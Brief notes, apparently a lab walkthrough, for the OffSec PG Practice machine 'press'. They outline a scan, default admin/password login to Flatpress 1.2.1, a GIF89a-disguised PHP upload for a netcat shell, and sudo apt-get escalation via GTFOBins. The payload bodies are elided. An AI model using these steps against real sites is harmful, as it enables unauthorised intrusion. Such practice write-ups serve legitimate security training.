###### tags: `Offsec` `PG Practice` `Intermediate` `Linux` # press
```
┌──(kali㉿kali)-[~/pgplay]
...
|_http-server-header: Apache/2.4.56 (Debian)
``` Search[Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152),,First use`admin/password`login,Click`Uploader`,payload`GIF89a;`
```
GIF89a;
<?php
...
...
``` uploadClick`Media manager`,Open nc,Click`shell.php`shell,use`sudo -l`
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check[GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#shell),
```
